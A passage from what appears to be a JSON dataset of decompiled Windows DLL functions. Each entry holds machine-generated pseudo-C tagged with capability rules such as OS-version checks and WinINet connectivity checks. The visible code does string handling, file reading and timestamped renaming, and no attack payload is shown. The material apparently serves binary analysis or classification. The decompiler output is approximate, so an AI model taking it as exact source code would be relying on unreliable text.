CONCAT44(uStack76, uStack80)) {\n        iVar9 = CONCAT62(Stack102, uStack104);\n        iVar8 = iVar9;\n        if ((0xfff < CONCAT44(uStack76, uStack80) * 2 + 2) && (iVar8 = *(iVar9 + -8),  0x1f < (iVar9 - iVar8) - 8U))\n        goto code_r0x00018000a950;\n        fcn.18008fb24(iVar8);\n    }\n    uStack76 = *0x18010190c;\n    uStack80 = *0x180101908;\n    uStack84 = *0x180101904;\n    uStack88 = *0x180101900;\n    uStack104 = 0;\n    if (puStack184 != NULL) {\n        LOCK();\n        piVar1 = puStack184 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar7 = puStack184;\n        if (iVar2 == 1) {\n            while (puVar7 != NULL) {\n                puVar3 = puVar7[2];\n                puVar7[2] = 0;\n                (***puVar7)(puVar7, 1);\n                puVar7 = puVar3;\n            }\n        }\n    }\n    puStack184 = NULL;\n    if ((piStack152 != NULL) && (puVar7 = (**(*piStack152 + 0x10))(),  puVar7 != NULL)) {\n        (***puVar7)(puVar7, 1);\n    }\n    puStack144 = NULL;\n    fcn.180010540(auStack136);\n    fcn.1800131f0(&puStack144, 0x1800f47f0, 0x1800f47f6);\n    uVar6 = fcn.180013060(&uStack72, arg2, &puStack144, 0x1800f47e4);\n    fcn.18000d960(arg2, uVar6);\n    if (7 < CONCAT44(uStack44, uStack48)) {\n        iVar8 = CONCAT44(uStack44, uStack48) * 2;\n        iVar5 = CONCAT62(Stack70, uStack72);\n        iVar9 = iVar5;\n        if (0xfff < iVar8 + 2U) {\n            iVar9 = *(iVar5 + -8);\n            if (0x1f < (iVar5 - iVar9) - 8U) {\n                fcn.1800b3528(iVar9, iVar8 + 0x29);\ncode_r0x00018000a950:\n                fcn.1800b3528();\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar9);\n    }\n    uStack44 = *0x18010190c;\n    uStack48 = *0x180101908;\n    uStack52 = *0x180101904;\n    uStack56 = *0x180101900;\n    uStack72 = 0;\n    if (puStack144 != NULL) {\n        LOCK();\n        piVar1 = puStack144 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar7 = puStack144;\n        if (iVar2 == 1) {\n            while (puVar7 != NULL) {\n                puVar3 = puVar7[2];\n                puVar7[2] = 0;\n                (***puVar7)(puVar7, 1);\n                puVar7 = puVar3;\n            }\n        }\n    }\n    puStack144 = NULL;\n    if ((piStack112 != NULL) && (puVar7 = (**(*piStack112 + 0x10))(),  puVar7 != NULL)) {\n        (***puVar7)(puVar7, 1);\n    }\n    return;\n}\n",
        "token_count": 1218
    },
    "18000a96": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18000a960(ulong noname_0, ulong *arg2, ulong *arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int64_t *arg1;\n    ulong arg2_00;\n    int64_t **ppiVar4;\n    uchar auStack88 [32];\n    ulong uStack56;\n    int64_t **ppiStack48;\n    uint64_t uStack40;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack88;\n    ppiStack48 = arg4;\n    if ((arg4[2] == NULL) && (arg4 != 0x1801255d8)) {\n        arg2_00 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            arg2_00 = *0x1801255d8;\n        }\n        fcn.180011120(arg4, arg2_00, *0x1801255e8);\n    }\n    ppiVar4 = arg4;\n    if (0xf < arg4[3]) {\n        ppiVar4 = *arg4;\n    }\n    if (0xf < arg3[3]) {\n        arg3 = *arg3;\n    }\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    (**0x1800de490)(arg2, arg3, 0, ppiVar4);\n    piVar1 = arg4[3];\n    if (0xf < piVar1) {\n        piVar2 = *arg4;\n        arg1 = piVar2;\n        if (0xfff < piVar1 + 1U) {\n            arg1 = piVar2[-1];\n            if (0x1f < (piVar2 - arg1) - 8U) {\n                fcn.1800b3528(piVar2 - arg1, piVar1 + 5);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1);\n    }\n    arg4[2] = NULL;\n    arg4[3] = 0xf;\n    *arg4 = 0;\n    fcn.18008fb00(uStack40 ^ auStack88);\n    return;\n}\n",
        "token_count": 544
    },
    "18000aaf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18000aaf0(ulong noname_0, uint32_t *arg2, int64_t *arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t arg1;\n    int32_t iVar5;\n    uint32_t *arg2_00;\n    ulong uVar6;\n    ulong in_R9;\n    ulong var_30h;\n    ulong var_90h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b0h;\n    uchar auStack472 [32];\n    uint uStack440;\n    int32_t iStack424;\n    uint uStack420;\n    int32_t iStack416;\n    uint uStack412;\n    ulong uStack408;\n    code **ppcStack392;\n    uchar uStack384;\n    ulong uStack376;\n    ulong uStack368;\n    int64_t *piStack360;\n    int32_t iStack348;\n    code *apcStack344 [2];\n    uint8_t auStack328 [56];\n    int64_t *apiStack272 [13];\n    code *apcStack168 [4];\n    ulong var_80h;\n    ulong var_bp_70h;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    ulong var_38h;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint64_t uStack40;\n    \n    uStack368 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack472;\n    piStack360 = arg3;\n    if ((arg3[2] == 0) && (arg3 != 0x180125578)) {\n        uVar6 = 0x180125578;\n        if (7 < *0x180125590) {\n            uVar6 = *0x180125578;\n        }\n        fcn.180010d70(arg3, uVar6, *0x180125588);\n    }\n    uVar6 = 0x110;\n    fcn.1800ae290(apcStack344, 0, 0x110);\n    fcn.18000f280(apcStack344, arg3, uVar6, in_R9);\n    iVar3 = *(apcStack344[0] + 4);\n    if ((auStack328[iVar3] & 6) == 0) {\n        ppcStack392 = apcStack344;\n        if (*(apiStack272 + iVar3) != NULL) {\n            (**(**(apiStack272 + iVar3) + 8))();\n        }\n        uStack384 = fcn.180012070(apcStack344);\n        if ((auStack328[*(apcStack344[0] + 4)] & 6) == 0) {\n            piVar4 = *(apiStack272 + *(apcStack344[0] + 4));\n            uStack440 = 1;\n            (**(*piVar4 + 0x50))(piVar4, &iStack424, 0, 1);\n            piVar4 = *(apiStack272 + *(apcStack344[0] + 4));\n        }\n        else {\n            iStack424 = -1;\n            uStack420 = 0xffffffff;\n            uStack408 = 0;\n            iStack416 = 0;\n            uStack412 = 0;\n            piVar4 = *(apiStack272 + *(apcStack344[0] + 4));\n        }\n        if (piVar4 != NULL) {\n            (**(*piVar4 + 0x10))();\n        }\n        iVar5 = iStack424 + iStack416;\n        uStack56 = *0x180101910;\n        uStack52 = *0x180101914;\n        uStack48 = *0x180101918;\n        uStack44 = *0x18010191c;\n        uStack72 = uStack72 & 0xffffff00;\n        fcn.180010fa0(&uStack72, iVar5);\n        iStack416 = 0;\n        uStack376 = 0;\n        iStack424 = 0;\n        uStack420 = 0;\n        uStack412 = 0;\n        uStack408 = 0;\n        fcn.180010140(apcStack344, &iStack424);\n        arg2_00 = &uStack72;\n        if (0xf < CONCAT44(uStack44, uStack48)) {\n            arg2_00 = CONCAT44(uStack68, uStack72);\n        }\n        fcn.180010250(apcStack344, arg2_00, iVar5);\n        *arg2 = uStack72;\n        arg2[1] = uStack68;\n        arg2[2] = var_38h;\n        arg2[3] = var_38h._4_4_;\n        arg2[4] = uStack56;\n        arg2[5] = uStack52;\n        arg2[6] = uStack48;\n        arg2[7] = uStack44;\n        uStack56 = *0x180101910;\n        uStack52 = *0x180101914;\n        uStack48 = *0x180101918;\n        uStack44 = *0x18010191c;\n        uStack72 = uStack72 & 0xffffff00;\n        *(apcStack344 + *(apcStack344[0] + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n        *(&iStack348 + *(apcStack344[0] + 4)) = *(apcStack344[0] + 4) + -0xb0;\n        fcn.18000ff30(auStack328);\n        *(apcStack344 + *(apcStack344[0] + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n        *(&iStack348 + *(apcStack344[0] + 4)) = *(apcStack344[0] + 4) + -0x18;\n        apcStack168[0] = vtable.std::ios_base.0;\n        fcn.180073e6c(apcStack168);\n        if (arg3[3] < 8) goto code_r0x00018000ae3b;\n        iVar3 = arg3[3] * 2;\n        iVar1 = *arg3;\n        arg1 = iVar1;\n        if (0xfff < iVar3 + 2U) {\n            arg1 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1) - 8U) {\n                fcn.1800b3528(iVar1 - arg1, iVar3 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n    }\n    else {\n        *(apcStack344 + iVar3) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n        *(&iStack348 + *(apcStack344[0] + 4)) = *(apcStack344[0] + 4) + -0xb0;\n        fcn.18000ff30(auStack328);\n        *(apcStack344 + *(apcStack344[0] + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n        *(&iStack348 + *(apcStack344[0] + 4)) = *(apcStack344[0] + 4) + -0x18;\n        apcStack168[0] = vtable.std::ios_base.0;\n        fcn.180073e6c(apcStack168);\n        *(arg2 + 4) = 0;\n        *(arg2 + 6) = 0xf;\n        *arg2 = 0;\n        fcn.180011120(arg2, 0x1800f466f, 0);\n        if (arg3[3] < 8) goto code_r0x00018000ae3b;\n        iVar3 = arg3[3] * 2;\n        iVar1 = *arg3;\n        arg1 = iVar1;\n        if (0xfff < iVar3 + 2U) {\n            arg1 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1) - 8U) {\n                fcn.1800b3528(iVar1 - arg1, iVar3 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n    }\n    fcn.18008fb24(arg1);\ncode_r0x00018000ae3b:\n    *arg3 = 0;\n    arg3[3] = 7;\n    arg3[2] = 0;\n    fcn.18008fb00(uStack40 ^ auStack472);\n    return;\n}\n",
        "token_count": 2011
    },
    "18000b42": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18000b420(ulong noname_0, int64_t **arg2)\n\n{\n    ushort *arg1;\n    code *pcVar1;\n    int64_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int64_t *piVar6;\n    ulong uVar7;\n    ulong arg1_00;\n    ushort *puVar8;\n    int64_t **ppiVar9;\n    int64_t *arg1_01;\n    uchar *puVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int16_t *piVar13;\n    ulong ******ppppppuVar14;\n    int16_t *piVar15;\n    int64_t arg3;\n    ulong ******ppppppuVar16;\n    uchar auStack1256 [32];\n    uint64_t uStack1224;\n    uchar uStack1208;\n    uchar uStack1207;\n    unkbyte6 Stack1206;\n    uint64_t uStack1192;\n    uint64_t uStack1184;\n    ushort uStack1176;\n    unkbyte6 Stack1174;\n    ulong uStack1160;\n    uint64_t uStack1152;\n    ushort uStack1144;\n    unkbyte6 Stack1142;\n    int64_t iStack1128;\n    uint64_t uStack1120;\n    ushort uStack1112;\n    unkbyte6 Stack1110;\n    int64_t iStack1096;\n    uint64_t uStack1088;\n    ulong ******ppppppuStack1072;\n    int64_t iStack1064;\n    uint64_t uStack1056;\n    uint64_t uStack1048;\n    ulong uStack1040;\n    uchar auStack1032 [128];\n    int64_t **ppiStack904;\n    ushort uStack896;\n    unkbyte6 Stack894;\n    int64_t iStack880;\n    uint64_t uStack872;\n    uchar auStack864 [8];\n    char acStack856 [272];\n    uchar auStack584 [528];\n    uint64_t uStack56;\n    \n    uStack1040 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack1256;\n    ppiVar9 = arg2;\n    if (0x7 < arg2[3]) {\n        ppiVar9 = *arg2;\n    }\n    iStack1096 = 0;\n    uStack1088 = 7;\n    uStack1112 = 0;\n    ppiStack904 = arg2;\n    fcn.180010d70(&uStack1112, ppiVar9, arg2[2]);\n    puVar8 = &uStack1112;\n    if (7 < uStack1088) {\n        puVar8 = CONCAT62(Stack1110, uStack1112);\n    }\n    piVar5 = puVar8 + iStack1096;\n    piVar15 = piVar5;\n    piVar4 = fcn.180003d30(puVar8, piVar5);\n    piVar13 = piVar5;\n    while (piVar3 = piVar15,  piVar4 != piVar13) {\n        piVar13 = piVar3 + -1;\n        if ((*piVar13 == 0x5c) || (piVar15 = piVar13,  *piVar13 == 0x2f)) break;\n    }\n    piVar13 = piVar3;\n    if (piVar3 != piVar5) {\n        do {\n            if (*piVar13 == 0x3a) break;\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != piVar5);\n        if ((piVar3 != piVar13) && (piVar5 = piVar13 + -1,  piVar3 != piVar5)) {\n            if (*piVar5 == 0x2e) {\n                if ((piVar3 != piVar13 + -2) || (piVar13[-2] != 0x2e)) {\ncode_r0x00018000b51a:\n                    piVar13 = piVar5;\n                }\n            }\n            else {\n                for (piVar5 = piVar13 + -2; piVar3 != piVar5; piVar5 = piVar5 + -1) {\n                    if (*piVar5 == 0x2e) goto code_r0x00018000b51a;\n                }\n            }\n        }\n    }\n    iStack1128 = 0;\n    uStack1120 = 7;\n    uStack1144 = 0;\n    fcn.180010d70(&uStack1144, piVar3, piVar13 - piVar3 >> 1);\n    puVar8 = &uStack1144;\n    if (7 < uStack1120) {\n        puVar8 = CONCAT62(Stack1142, uStack1144);\n    }\n    uStack1192 = CONCAT44(*0x180101904, *0x180101900);\n    uStack1184 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack1208 = 0;\n    uStack1207 = 0;\n    iVar11 = -1;\n    do {\n        iVar11 = iVar11 + 1;\n    } while (puVar8[iVar11] != 0);\n    fcn.180010d70(&uStack1208, puVar8, iVar11);\n    iStack880 = 0;\n    uStack872 = 7;\n    uStack896 = 0;\n    uVar12 = 0x1e;\n    if (uStack1192 < 0x1e) {\n        uVar12 = uStack1192;\n    }\n    puVar10 = &uStack1208;\n    if (7 < uStack1184) {\n        puVar10 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n    }\n    fcn.180010d70(&uStack896, puVar10, uVar12);\n    if (uStack1184 < 8) {\ncode_r0x00018000b60a:\n        if (7 < uStack1120) {\n            iVar2 = CONCAT62(Stack1142, uStack1144);\n            iVar11 = iVar2;\n            if ((uStack1120 * 2 + 2 < 0x1000) || (iVar11 = *(iVar2 + -8),  (iVar2 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018000b64c;\n            }\n            goto code_r0x00018000bcb3;\n        }\ncode_r0x00018000b64c:\n        if (7 < uStack1088) {\n            iVar2 = CONCAT62(Stack1110, uStack1112);\n            iVar11 = iVar2;\n            if ((uStack1088 * 2 + 2 < 0x1000) || (iVar11 = *(iVar2 + -8),  (iVar2 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018000b68c;\n            }\n            goto code_r0x00018000bcb9;\n        }\ncode_r0x00018000b68c:\n        iStack1096 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1088 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1112 = 0;\n        ppiVar9 = arg2;\n        if (0x7 < arg2[3]) {\n            ppiVar9 = *arg2;\n        }\n        iStack1128 = 0;\n        uStack1120 = 7;\n        uStack1144 = 0;\n        fcn.180010d70(&uStack1144, ppiVar9, arg2[2]);\n        puVar8 = &uStack1144;\n        if (7 < uStack1120) {\n            puVar8 = CONCAT62(Stack1142, uStack1144);\n        }\n        piVar5 = puVar8 + iStack1128;\n        piVar15 = piVar5;\n        piVar4 = fcn.180003d30(puVar8, piVar5);\n        piVar13 = piVar5;\n        while (piVar3 = piVar15,  piVar4 != piVar13) {\n            piVar13 = piVar3 + -1;\n            if ((*piVar13 == 0x5c) || (piVar15 = piVar13,  *piVar13 == 0x2f)) break;\n        }\n        piVar13 = piVar3;\n        if (piVar3 == piVar5) {\ncode_r0x00018000b795:\n            piVar5 = piVar13;\n            piVar13 = piVar5;\n        }\n        else {\n            do {\n                if (*piVar13 == 0x3a) break;\n                piVar13 = piVar13 + 1;\n            } while (piVar13 != piVar5);\n            if ((piVar3 == piVar13) || (piVar5 = piVar13 + -1,  piVar3 == piVar5)) goto code_r0x00018000b795;\n            if (*piVar5 != 0x2e) {\n                for (piVar5 = piVar13 + -2; piVar3 != piVar5; piVar5 = piVar5 + -1) {\n                    if (*piVar5 == 0x2e) goto code_r0x00018000b798;\n                }\n                goto code_r0x00018000b795;\n            }\n            if ((piVar3 == piVar13 + -2) && (piVar13[-2] == 0x2e)) goto code_r0x00018000b795;\n        }\ncode_r0x00018000b798:\n        uStack1192 = 0;\n        uStack1184 = 7;\n        uStack1208 = 0;\n        uStack1207 = 0;\n        fcn.180010d70(&uStack1208, piVar5, piVar13 - piVar5 >> 1);\n        puVar10 = &uStack1208;\n        if (7 < uStack1184) {\n            puVar10 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n        }\n        uStack1160 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1152 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1176 = 0;\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(puVar10 + iVar11 * 2) != 0);\n        fcn.180010d70(&uStack1176, puVar10, iVar11);\n        piVar6 = fcn.180014b80(&uStack1176, puVar10, L\"_%Y%m%d_%H%M%S\", 0xe);\n        ppppppuVar16 = *piVar6;\n        iStack1064 = piVar6[1];\n        uStack1056 = piVar6[2];\n        uVar12 = piVar6[3];\n        piVar6[2] = 0;\n        piVar6[3] = 7;\n        *piVar6 = 0;\n        ppppppuVar14 = &ppppppuStack1072;\n        if (7 < uVar12) {\n            ppppppuVar14 = ppppppuVar16;\n        }\n        ppppppuStack1072 = ppppppuVar16;\n        uStack1048 = uVar12;\n        if (uStack872 - iStack880 < uStack1056) {\n            uStack1224 = uStack1056;\n            fcn.180013690(&uStack896, uStack1056, 0, ppppppuVar14);\n            uVar12 = uStack1048;\n            ppppppuVar16 = ppppppuStack1072;\n        }\n        else {\n            iVar11 = uStack1056 + iStack880;\n            puVar8 = &uStack896;\n            if (7 < uStack872) {\n                puVar8 = CONCAT62(Stack894, uStack896);\n            }\n            arg1 = puVar8 + iStack880;\n            iStack880 = iVar11;\n            fcn.1800ade80(arg1, ppppppuVar14, uStack1056 * 2);\n            puVar8[iVar11] = 0;\n        }\n        if (7 < uVar12) {\n            ppppppuVar14 = ppppppuVar16;\n            if ((uVar12 * 2 + 2 < 0x1000) ||\n               (ppppppuVar14 = ppppppuVar16[-1],  ppppppuVar16 + (-8 - ppppppuVar14) < 0x20)) {\n                fcn.18008fb24(ppppppuVar14);\n                goto code_r0x00018000b8ec;\n            }\n            goto code_r0x00018000bcbf;\n        }\ncode_r0x00018000b8ec:\n        if (7 < uStack1152) {\n            iVar2 = CONCAT62(Stack1174, uStack1176);\n            iVar11 = iVar2;\n            if ((uStack1152 * 2 + 2 < 0x1000) || (iVar11 = *(iVar2 + -8),  (iVar2 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018000b92e;\n            }\n            goto code_r0x00018000bcc5;\n        }\ncode_r0x00018000b92e:\n        uStack1160 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1152 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1176 = 0;\n        if (uStack1184 < 8) {\ncode_r0x00018000b985:\n            if (7 < uStack1120) {\n                iVar2 = CONCAT62(Stack1142, uStack1144);\n                iVar11 = iVar2;\n                if ((0xfff < uStack1120 * 2 + 2) && (iVar11 = *(iVar2 + -8),  0x1f < (iVar2 - iVar11) - 8U))\n                goto code_r0x00018000bcd1;\n                fcn.18008fb24(iVar11);\n            }\n            fcn.1800b2838(auStack864);\n            uVar7 = fcn.1800b2b70(auStack864);\n            arg1_00 = fcn.1800687b0(auStack1032);\n            puVar8 = &uStack896;\n            if (7 < uStack872) {\n                puVar8 = CONCAT62(Stack894, uStack896);\n            }\n            fcn.180068c50(arg1_00, &uStack1176, puVar8, puVar8 + iStack880);\n            fcn.1800686c0(auStack1032);\n            puVar8 = &uStack1176;\n            if (0xf < uStack1152) {\n                puVar8 = CONCAT62(Stack1174, uStack1176);\n            }\n            fcn.1800b1d4c(acStack856, 0x104, puVar8, uVar7);\n            if (0xf < uStack1152) {\n                iVar2 = CONCAT62(Stack1174, uStack1176);\n                iVar11 = iVar2;\n                if (uStack1152 + 1 < 0x1000) {\ncode_r0x00018000ba78:\n                    fcn.18008fb24(iVar11);\n                    goto code_r0x00018000ba7d;\n                }\n                iVar11 = *(iVar2 + -8);\n                if ((iVar2 - iVar11) - 8U < 0x20) goto code_r0x00018000ba78;\n                fcn.1800b3528(iVar11, uStack1152 + 0x28);\ncode_r0x00018000bcdd:\n                fcn.1800b3528();\ncode_r0x00018000bce3:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\ncode_r0x00018000ba7d:\n            uStack1192 = 0;\n            uStack1184 = 0xf;\n            uStack1208 = 0;\n            iVar11 = -1;\n            do {\n                arg3 = iVar11 + 1;\n                iVar2 = iVar11 + 1;\n                iVar11 = arg3;\n            } while (acStack856[iVar2] != '\\0');\n            fcn.180011120(&uStack1208, acStack856, arg3);\n            uVar7 = fcn.1800687b0(auStack1032);\n            puVar10 = &uStack1208;\n            if (0xf < uStack1184) {\n                puVar10 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n            }\n            fcn.180069050(uVar7, &uStack1176, puVar10, puVar10 + uStack1192);\n            fcn.1800686c0(auStack1032);\n            puVar8 = &uStack1176;\n            if (7 < uStack1152) {\n                puVar8 = CONCAT62(Stack1174, uStack1176);\n            }\n            (**0x1800de580)(auStack584, 0x180124b18, puVar8);\n            if (7 < uStack1152) {\n                iVar2 = CONCAT62(Stack1174, uStack1176);\n                iVar11 = iVar2;\n                if ((0xfff < uStack1152 * 2 + 2) && (iVar11 = *(iVar2 + -8),  0x1f < (iVar2 - iVar11) - 8U))\n                goto code_r0x00018000bcdd;\n                fcn.18008fb24(iVar11);\n            }\n            uStack1160 = CONCAT44(*0x180101904, *0x180101900);\n            uStack1152 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack1176 = 0;\n            if (0xf < uStack1184) {\n                iVar2 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n                iVar11 = iVar2;\n                if ((0xfff < uStack1184 + 1) && (iVar11 = *(iVar2 + -8),  0x1f < (iVar2 - iVar11) - 8U))\n                goto code_r0x00018000bce3;\n                fcn.18008fb24(iVar11);\n            }\n            ppiVar9 = arg2;\n            if (0x7 < arg2[3]) {\n                ppiVar9 = *arg2;\n            }\n            (**0x1800de488)(ppiVar9, auStack584, 0);\n            if (uStack872 < 8) {\ncode_r0x00018000bc12:\n                iStack880 = 0;\n                uStack872 = 7;\n                uStack896 = 0;\n                if (arg2[3] < 0x8) {\ncode_r0x00018000bc61:\n                    arg2[2] = NULL;\n                    arg2[3] = 0x7;\n                    *arg2 = 0;\n                    fcn.18008fb00(uStack56 ^ auStack1256);\n                    return;\n                }\n                piVar6 = *arg2;\n                arg1_01 = piVar6;\n                if ((arg2[3] * 2 + 2U < 0x1000) || (arg1_01 = piVar6[-1],  piVar6 + (-8 - arg1_01) < 0x20)) {\n                    fcn.18008fb24(arg1_01);\n                    goto code_r0x00018000bc61;\n                }\n            }\n            else {\n                iVar2 = CONCAT62(Stack894, uStack896);\n                iVar11 = iVar2;\n                if (uStack872 * 2 + 2 < 0x1000) {\ncode_r0x00018000bc0d:\n                    fcn.18008fb24(iVar11);\n                    goto code_r0x00018000bc12;\n                }\n                iVar11 = *(iVar2 + -8);\n                if ((iVar2 - iVar11) - 8U < 0x20) goto code_r0x00018000bc0d;\n                fcn.1800b3528(iVar11, uStack872 * 2 + 0x29);\n            }\n            fcn.1800b3528();\n            goto code_r0x00018000bcad;\n        }\n        iVar2 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n        iVar11 = iVar2;\n        if ((uStack1184 * 2 + 2 < 0x1000) || (iVar11 = *(iVar2 + -8),  (iVar2 - iVar11) - 8U < 0x20)) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x00018000b985;\n        }\n    }\n    else {\n        iVar2 = CONCAT62(Stack1206, CONCAT11(uStack1207, uStack1208));\n        iVar11 = iVar2;\n        if ((uStack1184 * 2 + 2 < 0x1000) || (iVar11 = *(iVar2 + -8),  (iVar2 - iVar11) - 8U < 0x20)) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x00018000b60a;\n        }\ncode_r0x00018000bcad:\n        fcn.1800b3528();\ncode_r0x00018000bcb3:\n        fcn.1800b3528();\ncode_r0x00018000bcb9:\n        fcn.1800b3528();\ncode_r0x00018000bcbf:\n        fcn.1800b3528();\ncode_r0x00018000bcc5:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018000bcd1:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 5090
    },
    "18000c27": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000c270(ulong noname_0, int64_t **arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong uVar4;\n    int64_t *****pppppiVar5;\n    code **arg1;\n    int64_t *piVar6;\n    int64_t iVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    ulong *****pppppuVar13;\n    uint32_t uVar14;\n    int64_t **ppiVar15;\n    int32_t *arg2_00;\n    char *pcVar16;\n    char *pcVar17;\n    ulong in_R9;\n    ushort *arg4;\n    uint64_t uVar18;\n    uint uVar19;\n    int32_t iVar20;\n    uint uVar21;\n    uchar auStack952 [32];\n    uint uStack920;\n    int32_t iStack904;\n    uint uStack900;\n    int32_t iStack896;\n    uint uStack892;\n    ulong uStack888;\n    uint64_t uStack880;\n    code **ppcStack872;\n    uchar uStack864;\n    unkbyte7 Stack863;\n    int64_t iStack856;\n    int64_t *piStack848;\n    ulong uStack840;\n    ulong uStack832;\n    uchar auStack824 [124];\n    int32_t iStack700;\n    code *apcStack696 [2];\n    uint32_t auStack680 [12];\n    int64_t iStack632;\n    int64_t *apiStack624 [13];\n    code *apcStack520 [12];\n    int64_t **ppiStack424;\n    int32_t iStack412;\n    code *pcStack408;\n    uchar auStack400 [8];\n    uint8_t auStack392 [152];\n    code *apcStack240 [13];\n    int64_t *****pppppiStack136;\n    uint uStack128;\n    uint uStack124;\n    int64_t *piStack120;\n    uint64_t uStack112;\n    ulong *****apppppuStack104 [2];\n    uint64_t uStack88;\n    uint64_t uStack80;\n    code **ppcStack72;\n    uint64_t uStack64;\n    \n    uStack832 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack952;\n    pppppiVar5 = &pppppiStack136;\n    ppiStack424 = arg2;\n    uVar4 = fcn.18000da90(pppppiVar5, arg2);\n    iVar2 = fcn.18000bd70(pppppiVar5, uVar4);\n    if (iVar2 == 0) {\n        if (arg2[3] < 0x8) goto code_r0x00018000cf59;\n        iVar7 = arg2[3] * 2;\n        piVar10 = *arg2;\n        piVar6 = piVar10;\n        if (0xfff < iVar7 + 2U) {\n            piVar6 = piVar10[-1];\n            if (0x1f < (piVar10 - piVar6) - 8U) {\n                fcn.1800b3528(piVar10 - piVar6, iVar7 + 0x29);\ncode_r0x00018000cfb0:\n                fcn.180014b60();\ncode_r0x00018000cfb6:\n                fcn.1800b3528();\ncode_r0x00018000cfbc:\n                fcn.1800b3528();\ncode_r0x00018000cfc2:\n                fcn.1800b3528();\ncode_r0x00018000cfc8:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(piVar6);\n    }\n    else {\n        piStack120 = NULL;\n        uStack112 = 0;\n        piVar10 = arg2[2];\n        ppiVar15 = arg2;\n        if (0x7 < arg2[3]) {\n            ppiVar15 = *arg2;\n        }\n        if (piVar10 < 0x8) {\n            pppppiStack136 = *ppiVar15;\n            uStack128 = *(ppiVar15 + 1);\n            uStack124 = *(ppiVar15 + 0xc);\n            uStack112 = 7;\n        }\n        else {\n            uVar18 = piVar10 | 7;\n            if (0x7ffffffffffffffe < uVar18) {\n                uVar18 = 0x7ffffffffffffffe;\n            }\n            